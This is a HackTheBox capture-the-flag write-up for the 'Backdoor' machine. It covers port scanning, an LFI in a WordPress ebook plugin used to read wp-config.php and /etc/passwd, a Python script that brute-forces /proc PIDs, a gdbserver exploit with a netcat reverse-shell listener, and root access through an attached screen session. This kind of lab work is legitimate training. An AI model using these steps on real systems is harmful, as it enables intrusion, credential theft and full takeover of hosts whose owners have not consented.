---
title: 'HackTheBox write-up: Backdoor'
author: ib4rz
date: 2022-02-06 22:00
categories: [Machines, Linux]
image:
  path: /assets/img/Backdoor/Backdoor.png
tags: [Easy, WordPress, WPScan, LFI, RCE, SUID]
---

This is a write-up for the Backdoor machine on HackTheBox. We're back after a bit of inactivity, but... here we go. This box is an excellent entry-level challenge for those new to HackTheBox.

## Basic information
---

Machine IP: __10.10.11.125__ \
Type: __Linux__ \
Difficulty: __Easy__

## Scanning 
---

First, to find interesting open ports, let's do some reconnaissance and scanning using [nmap](https://nmap.org/).

```console
$ nmap -p- --open -T5 -v -n 10.10.11.125
```

Parameters explanation:

- _p-_: Scan all 65,535 possible port numbers.
- _open_: Only show open (or possibly open) ports.
- _T5_: Faster scan _(T<0-5>)_.
- _v_: Increase verbosity level.
- _n_: Never do DNS resolution.

```console
$ nmap -p- --open -T5 -v -n 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 16:50 CET
Initiating Ping Scan at 16:50
Scanning 10.10.11.125 [4 ports]
Completed Ping Scan at 16:50, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:50
Scanning 10.10.11.125 [65535 ports]
Discovered open port 22/tcp on 10.10.11.125
Discovered open port 80/tcp on 10.10.11.125
SYN Stealth Scan Timing: About 34.63% done; ETC: 16:52 (0:00:59 remaining)
Discovered open port 1337/tcp on 10.10.11.125
Completed SYN Stealth Scan at 16:52, 96.48s elapsed (65535 total ports)
Nmap scan report for 10.10.11.125
Host is up (0.29s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 96.66 seconds
           Raw packets sent: 76538 (3.368MB) | Rcvd: 76498 (3.060MB)
```

We see that the machine has a Secure Shell (_port 22_), a web page (_port 80_) and some mystery 1337 port.

## Enumeration
---

We can run `Nmap Scripting Engine` for service/version detection running through each port for the best results.

```console
$ nmap -sVC -p22,80,1337 10.10.11.125
```

Parameters explanation:

- _sV_: Service fingerprinting.
- _sC_: Launch default NSE nmap scripts.
- _p_: Only scan specified ports.

```console
$ nmap -sVC -p22,80,1337 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 16:55 CET
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds
```

Relevant information:

| Port  | Service  | Version                         |
| ----- | ---------| --------------------------------|
| 22    | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80    | HTTP     | Apache httpd 2.4.41             |
| 1337  | waste?   | 

Let's identify the website with [WhatWeb](https://tools.kali.org/web-applications/whatweb).

```console
$ whatweb http://10.10.11.125
http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

As we have seen, it's running on Apache server version 2.4.41. It also tells us that the site is based on WordPress CMS. Now's time to visit the website.

![Desktop View](/assets/img/Backdoor/web.jpg){: }

There doesn't seem to be anything useful.

Let's find hidden directories using brute force with [Wfuzz](https://tools.kali.org/web-applications/wfuzz).

```console
$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.125/FUZZ
```

Parameters explanation:
- _c_: Output with colors.
- _L_: Follow HTTP redirections.
- _t_: Specify the number of concurrent connections (10 default).
- _hc_: Hide responses with the specified code.
- _w_: Specify a wordlist file.

> `FUZZ`: Wherever you put these keywords wfuzz, will replace them with the values of the specified payload
{: .prompt-info }

```console
$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.125/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.125/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000786:   200        250 L    2537 W     52159 Ch    "wp-includes"
000007180:   200        98 L     371 W      5674 Ch     "wp-admin"
000000241:   200        0 L      0 W        0 Ch        "wp-content"
000095524:   403        9 L      28 W       277 Ch      "server-status"
```

Wfuzz finds main WordPress files. At first glance, nothing appears to be interesting except the `wp-includes`{: .filepath} folder, which contains backend files.

![Desktop View](/assets/img/Backdoor/wp-includes.jpg){: }

## Vulnerability Analysis & Exploitation
---

### Enumeration WordPress
---

Since we know that the website uses WordPress, let's run [__wpscan__](https://wpscan.com/wordpress-security-scanner) to gather more information and possible vulnerabilities.

```console
$ wpscan --url http://backdoor.htb/ --enumerate p,u --plugins-detection aggressive --api-token TOKEN
```

Parameters explanation:
- _url_: The URL of the blog to scan.
- _enumerate_: _p_ - Popular plugins, _u_ - Users
- _plugins-detection_: Agressive mode to enumerate Plugins.
- _api-token_: The WPScan API Token to display vulnerability data, available [here](https://wpscan).

![Desktop View](/assets/img/Backdoor/wpscan.png){: }

The WPScan identifies an __Unauthenticated Stored Cross-Site Scripting (XSS)__ in the [Akismet](https://akismet.com/) plugin.

Having one vulnerability with path `http://backdoor.htb/wp-content/plugins/akismet/`{: .filepath}. Trying to visit the path, we won't have permission to access that resource.

Since directory listing is allowed, let's go one directory down.

![Desktop View](/assets/img/Backdoor/plugins.png){: }

We access the `ebook-download`{: .filepath} folder.

![Desktop View](/assets/img/Backdoor/ebook.png){: }

Unfortunately, we found nothing interesting.

### Analysis
---

So, let's try to find ebook plugin exploits. Hopefully, we find something.

![Desktop View](/assets/img/Backdoor/searchsploit.png){: }


There seem to be potential exploits. Let's use exploit number [39575](https://www.exploit-db.com/exploits/39575). 

![Desktop View](/assets/img/Backdoor/exploit.png){: }

We encountered an __LFI__ vulnerability. From this vulnerability, we could download the `/etc/passwd`{: .filepath} file, but first, we will download the file `wp-config.php` that indicates the exploit.

![Desktop View](/assets/img/Backdoor/wp-config.png){: }

`wp-config.php` seems to have a credential. Trying to login into the WordPress admin panel with the credentials won't be successful.

In the same way, we have done with the wp-config file, doing Directory Traversal, we can download the `/etc/passwd`{: .filepath} file.

![Desktop View](/assets/img/Backdoor/passwd.png){: }

From the `/etc/passwd`{: .filepath} file, we can see a user named __user__ but nothing useful. We can't obtain the SSH key of user `/home/user/.ssh/id\_rsa`{: .filepath}.

After being stuck here, I searched the Internet to gain RCE access via LFI. I finally came accros a [blog](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/) that says we can brute force the PID in the `/proc/`{: .filepath} directory. In particular `/proc/[PID]/cmdline`{: .filepath} approach.

So, to successfully exploit this with brute force, let's write a Python script filtering the length of responses.

```python
#!/bin/python3

import signal
import requests
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Stopping the process...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"
empty_resp = 125

p1 = log.progress("Brute force")
p1.status("Starting brute force attack")

for pid in range(0,5000):
    p1.status("Testing pid %d" % (pid))
    content = (requests.get(main_url + str(pid) + "/cmdline")).content
    if (len(content) > empty_resp):
        print(f"[+] Process {pid} found")
        print(content)
        print("--------------------------------------------\n")
```

This outputs:

![Desktop View](/assets/img/Backdoor/script.png){: }

We have found the unknown service running in port __1337__ that we previously saw in the scanning phase.

### Getting complete control (RCE)
---

Searching __gdbserver__ exploits in [SearchSploit](https://www.exploit-db.com/).

![Desktop View](/assets/img/Backdoor/rce_exploit.png){: }

We get a __RCE__ result. Let's get to it!

We follow the steps of the exploit to create a reverse shell in a terminal, starting a listener on __port 4444__ with:

```console
$ nc -lvnp 4444
```
Parameters explanation:

- _l_: Listen for connections.
- _v_: Set verbosity level (can be used several times).
- _n_: Do not resolve hostnames via DNS.
- _p_: Specify source port to use.

We run the exploit.

![Desktop View](/assets/img/Backdoor/pwned.png){: }

And we obtain a reverse shell!

![Desktop View](/assets/img/Backdoor/user.png){: }

> The first step is always stabilizing the shell so we can't accidentally close the connection if we press something like CTRL+C.
{: .prompt-tip }

```console
$ script /dev/null -c bash
CTRL + Z (nc process into the background)
$ stty raw -echo; fg
$ reset
$ xterm
$ export TERM=xterm
$ export SHELL=bash
```
Now we should have a fully stabilized shell.

Now we can get the __user.txt__ flag on user's home.

![Desktop View](/assets/img/Backdoor/user_flag.png){: }

## Privilege Escalation
---

We already got the user-level flag. Now let's get the admin flag level.

Now let's search SUID binaries to try to escalate privileges.

There is a suspicious binary `screen`. And googling for privilege escalation through the screen, we find that the [screen](https://www.gnu.org/software/screen/manual/screen.html#Session-Management) command has the `-x` option that we can get attached to an existing screen session, which is running as root.

So, the command will be:

```console
user@Backdoor: screen -x root/root
```

Doing that, we extract the root flag, and that's it.

![Desktop View](/assets/img/Backdoor/root.png){: }

Backdoor has been Pwned!